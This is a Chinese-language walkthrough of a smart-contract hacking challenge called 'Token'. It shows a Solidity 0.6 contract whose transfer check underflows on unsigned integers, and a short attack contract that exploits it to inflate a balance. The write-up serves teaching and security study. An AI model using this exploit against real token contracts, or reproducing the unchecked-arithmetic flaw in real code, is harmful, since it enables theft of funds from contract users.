# Token
Token這一關考察的是 solidity ^0.6.0中關於`uint` 數學計算的問題，讓我們先來看一下代碼

## 合约代码
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
## 代码分析
在這關中，我們的錢包會被預先給予**20個**token，而我們的目標是通過攻擊合約，將我們的token數量增加。整個合約的代碼非常簡單，唯一可以讓我們增加餘額的僅僅只是`transfer`函數。

進入看`transfer`函數，這個函數的入參有兩個，一個是接受地址，另一個是接受token的數量，而這個函數的實現非常簡單，就是將`msg.sender`的餘額減去`_value`，然後將`_value`加到接受地址的餘額上。在此之前，他需要檢查`msg.sender`的餘額是否大於`_value`，如果不是，則會拋出異常。

看似沒有什麽問題，但是在solidity ^0.6.0中，直接進行uint的計算經常會出現問題。儅0減去一個大於0的uint時，會導致結果溢出，而溢出的結果會是一個非常大的數字，這個數字會大於0，所以檢查就會通過，這就是我們要利用的漏洞。

那我們就需要使用一個合約，這個合約token的餘額為0，然後我們通過這個合約來調用`transfer`函數，transfer給我們的錢包任意的數量，都可以通過檢查，以此達到完成這關的目的。

## 攻击代码
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface Itoken {
  function transfer(address _to, uint _value) external returns (bool);
  function balanceOf(address) external view returns (uint256);
}

contract Attack {
  constructor(address _target) {
    Itoken(_target).transfer(msg.sender, 10);
  }
}
```
## 攻击过程
1. 獲取實例的地址所謂部署Attack合約時contructor的入參。
2. 使用Itoken與實例地址交互，調用balanceOf函數檢查餘額是否增加。
